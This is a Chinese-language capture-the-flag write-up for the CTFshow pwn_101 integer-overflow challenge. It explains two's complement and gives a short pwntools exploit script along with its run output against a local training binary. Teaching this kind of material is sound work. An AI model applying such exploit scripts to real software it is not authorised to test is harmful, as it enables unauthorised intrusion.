# CTFshow-pwn_101
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数溢出
## 解题思路
> 核心思路是补码的表示

保护全开
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_101
[*] '/home/mrw/CTFshow/pwn_101'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
程序主函数伪代码如下  
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v5; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  puts("Maybe these help you:");
  useful();
  v4 = 0x80000000;
  v5 = 0x7FFFFFFF;
  printf("Enter two integers: ");
  if ( (unsigned int)__isoc99_scanf("%d %d", &v4, &v5) == 2 )
  {
    if ( v4 == 0x80000000 && v5 == 0x7FFFFFFF )
      gift(); // 访问后获取flag "cat /ctfshow_flag"
    else
      printf("upover = %d, downover = %d\n", v4, v5);
    return 0;
  }
  else
  {
    puts("Error: Invalid input. Please enter two integers.");
    return 1;
  }
}
```
因此只需输入两个有符号整数使之无符号表示为 0x80000000 和 0x7FFFFFFF 即可获取得到flag。  
对于补码，最高位表示符号位，且满足`补码对应的无符号数值 mod 类型正数最大值 = 补码对应的有符号整数的绝对值`  
则 0x7FFFFFFF 对应 `2^31-1` 而 0x80000000 对应 `-2^31`  
**exp 如下**  
```python
from pwn import *
p = process('./pwn_101')
p.sendline(str(-2**31).encode() + b' ' + str(2**31-1).encode())
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_101.py 
[+] Starting local process './pwn_101': pid 5591
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Integer_Overflow                                        
    * Site  : https://ctf.show/                                       
    * Hint  : Learn something first !                                 
    * *************************************                           
Maybe these help you:
 ====================================================================================================
           Type         |      Byte      |                          Range                            
 ====================================================================================================
      short int         |     2 byte     |                  0~0x7fff 0x8000~0xffff                   
   unsigned short int   |     2 byte     |                        0~0xffff                           
          int           |     4 byte     |             0~0x7fffffff 0x80000000~0xffffffff            
    unsigned int        |     4 byte     |                        0~0xffffffff                       
      long int          |     8 byte     | 0~0x7fffffffffffffff 0x8000000000000000~0xffffffffffffffff
   unsigned long int    |     8 byte     |                    0~0xffffffffffffffff                   
 ====================================================================================================
Enter two integers: This is the first question of this type
Here is you want:
flag{Success!}
[*] Got EOF while reading in interactive

```